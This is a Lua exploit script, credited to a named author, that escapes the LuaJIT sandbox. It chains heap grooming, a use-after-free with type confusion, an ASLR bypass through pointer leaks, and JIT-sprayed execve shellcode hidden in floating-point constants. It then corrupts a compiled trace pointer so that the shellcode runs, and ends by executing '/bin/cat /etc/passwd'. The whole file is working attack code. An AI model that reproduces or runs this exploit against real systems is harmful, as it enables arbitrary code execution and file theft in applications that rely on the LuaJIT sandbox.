--[[
    This exploit is a sandbox escape for LuaJIT
    Download: https://luajit.org/download.html 
    Author: https://twitter.com/0x_shaq 

    Tested on:
     > ubuntu:20.04
     > LuaJIT compiled with default settings(just run `make`)
]]--

local uaf = function()
    -- heap grooming #1: Prepare the _string interning_ hash-table
      collectgarbage('collect')
      local dummy = 123 -- virtual stack 
      local spray = {}
        for i=0x30, (0x13c-18), 1 do
          spray[i] = string.rep('pewpew', i)
        end
      collectgarbage('collect')
  
      -- heap grooming #2: murder the allocator's `dv` chunk
        for i=(0x13c), (0x13c-1)+0x200, 1 do
          spray[i] = { 1.8457939563e-314, 1.8457939563e-314, 1.8457939563e-314 }
        end
      
      -- Achieve UAF primitive
      local freed = {
          2261634.5098039214,
          156842099844.51764,
          1.0843961455707782e+16,
          7.477080264543605e+20,
          5.142912663207646e+25,
      }
      local mov = freed   -- this `MOV` will be hot-patched with OOB by `exp-gen.py`
      freed = nil         -- Making the `GCtab` unreachable from the GC root
      collectgarbage('collect')
  
      -- Type Confusion!
      spray[0x30] = spray[0x30] .. 'another concat :D' -- Trigger a relocation of the global string hash table.
      return 1337         -- this `RET` will be hot-patched with OOB by `exp-gen.py`
                          -- Should return the value of the free'd `GCtab` object 
  end
  
  
  --[[ ======= exploit begins here ======= ]]--
  hash_t = string.upper('Gvx') -- hash-table hacking
  local rw_primitive = uaf()
  print('[*] UAF + type confusion done :D')
  
  -- preparing JIT-Spray
  local jitted = function(t, s, a)
    for i=0, 100, 1 do
      t[5e-324]=0
      t[1e-323]=0
      t[1.5e-323]=0
      t[2e-323]=0
      t[2.5e-323]=0
      t[3e-323]=0
      t[1.9055771651032652e-193]=0 -- xor rdx, rdx
      t[1.8559668824708362e-193]=0 -- add rbp, 0x18
      t[1.8494619877878633e-193]=0 -- mov rsi, [rbp]
      t[1.8517288554178477e-193]=0 -- sub rsi,0x8
      t[1.914498447205438e-193]=0  -- mov rbx, rsi
      t[1.8639327969763123e-193]=0 -- mov esi, [esi]
      t[1.8538274887895865e-193]=0 -- add rsi,0x10
      t[1.8516839145637716e-193]=0 -- add rbx,0x8
      t[1.8567088159676176e-193]=0 -- mov ebx, [ebx]
      t[1.8538243533811626e-193]=0 -- add rbx,0x10
      t[1.849450512851345e-193]=0  -- push 0
      t[1.8716972807551464e-193]=0 -- push rbx
      t[1.872875119460234e-193]=0  -- mov rdi,rsi; push rdi
      t[1.8745776759605808e-193]=0 -- push rsp; pop rsi
      t[1.8493391391782406e-193]=0 -- mov eax, 59
      t[1.8506931797233557e-193]=0 -- syscall
      end
  end
  
  -- extra trace for padding purposes in the GCRef traces array
  local tbl = {}
  for i=0, 100, 1 do
    tbl[i]=i
  end
  
  -- JIT-Spraying shellcode
  print('[*] Creating a hotloop')
  jitted(tbl)
  print('[*] Done, trace is ready!')
  
  
  -- ================= <helper funcs> =================
  -- this will help us to leverage the heap hints/leaks to completly break ASLR 
  local addrof = function(tval)
       local strhex = tostring(tval)
       local i = string.find(strhex, '0x')
       return tonumber(string.sub(strhex, i+2), 16)
  end
  
  -- unpacking 64bit values (from a floating point double/IEEE-754 to Hex)
  local u64 = function(num)
     local fixup = 2.3641409746639015e-308 -- 0x11000000000000
    num = num + fixup -- dirty hack, sorry
    local bytes = {0,0,0,0, 0,0,0,0}
  
    local anum = math.abs(num)
    local mantissa, exponent = math.frexp(anum)
    exponent = exponent - 1
    mantissa = mantissa * 2 - 1
  
    local sign = num ~= anum and 128 or 0
    
    exponent = exponent + 1023
    bytes[1] = sign + math.floor(exponent / 2^4)
  
    mantissa = mantissa * 2^4
    local currentmantissa = math.floor(mantissa)
    mantissa = mantissa - currentmantissa
  
    bytes[2] = (exponent % 2^4) * 2^4 + currentmantissa
    for i= 3, 8 do
      mantissa = mantissa * 2^8
      currentmantissa = math.floor(mantissa)
      mantissa = mantissa - currentmantissa
      bytes[i] = currentmantissa
  end
  
    return tonumber(
        string.format('0x%02x%02x%02x%02x%02x%02x',
          --  bytes[1],  
          --  bytes[2],  
            bytes[3],  
            bytes[4],  
            bytes[5],  
            bytes[6],
            bytes[7],  
            bytes[8]
    ) ,16)
    end
  
    -- unpacking 32bit values (from a floating point double/IEEE-754 to Hex)
  local u32 = function(num)
    local fixup = 2.3641409746639015e-308 -- 0x11000000000000
    num = num + fixup -- dirty hack, sorry
    local bytes = {0,0,0,0, 0,0,0,0}
  
    local anum = math.abs(num)
    local mantissa, exponent = math.frexp(anum)
    exponent = exponent - 1
    mantissa = mantissa * 2 - 1
  
    local sign = num ~= anum and 128 or 0
  
    exponent = exponent + 1023
    bytes[1] = sign + math.floor(exponent / 2^4)
  
    mantissa = mantissa * 2^4
    local currentmantissa = math.floor(mantissa)
    mantissa = mantissa - currentmantissa
  
    bytes[2] = (exponent % 2^4) * 2^4 + currentmantissa
    for i= 3, 8 do
      mantissa = mantissa * 2^8
      currentmantissa = math.floor(mantissa)
      mantissa = mantissa - currentmantissa
      bytes[i] = currentmantissa
    end
  
    return 0, tonumber(
        string.format('0x%02x%02x%02x%02x',
            bytes[5],  
            bytes[6],
            bytes[7],  
            bytes[8]
    ) ,16)
  end
  
  -- Fetch a function pointer from a `GCfunc` object
  local get_c_func = function(rw)
      local fcn_ptr = rw[(addrof(require)+0x18)   / 0x8] -- GCfuncC->f
      return fcn_ptr
  end
  -- ================= </helper funcs> =================  
  
  -- get C func addr(lj_alloc_f) to break ASLR
  local allocf_addr = get_c_func(rw_primitive) - 1.01738e-318 -- 0x32490 is the offset
  print('[*] allocf @ ', string.format("0x%x",u64(allocf_addr)))
  
  -- Searching for the `global_State` struct, in order to find the `jit_State` struct (neighbors, both are part of `GG_State`)  
  local nloop = addrof(require)
  print('[*] Finding global_State::allocf ptr... @ ',string.format("0x%x",nloop))
  while (nloop>0) do
      if(rw_primitive[nloop/8] == allocf_addr) then
          break 
      end
      nloop = nloop-8
  end 
  
  -- Got it, now dereference jit_State->trace[] array
  local gcref_arr = rw_primitive[(nloop+0x308-0x8)/8]
  print('[*] GCRef array @ ', string.format("0x%x",u64(gcref_arr)))
  
  local idx1, idx2 = u32(rw_primitive[(u64(gcref_arr)+0x10) /8]) -- grab the 4th index
  
  -- Dereference again, in order to reach the `mcode` pointer
  local gctrace = rw_primitive[(idx2+0x40) / 8]
  print('[*] GCtrace->mcode @ ',string.format("0x%x",u64(gctrace)))
  
  -- Corrupt it
  rw_primitive[(idx2+0x40) / 8] = gctrace+9.14e-322 -- adding 0x40 to reach to the `mcode` ptr; incr the ptr to create mis-alignment
  print('[*] JITed ptr corrupted! jumping to shellcode :^)\n')
  
  -- profit! 
  jitted(tbl,'/bin/cat','/etc/passwd')